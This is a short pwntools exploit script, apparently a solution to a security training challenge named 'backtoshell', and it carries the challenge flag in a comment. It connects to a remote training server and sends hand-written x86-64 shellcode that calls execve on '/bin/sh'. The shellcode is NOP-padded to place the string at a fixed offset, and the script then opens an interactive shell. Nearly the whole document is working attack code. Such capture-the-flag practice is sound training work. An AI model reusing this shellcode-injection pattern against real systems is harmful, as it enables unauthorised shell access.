from pwn import *
from pwn import p64

p = remote("bin.training.jinblack.it", 3001)
# p = process("./backtoshell")

# flag{Congratulation_you_got_aa_working_shellcode_!}

shellcode = asm("""
mov rdi, rax
add rdi, 0x100
mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch = 'amd64')

payload = shellcode
payload = payload.ljust(0x100, b"\x90")
payload += b"/bin/sh\0"

p.sendline(payload)
p.interactive()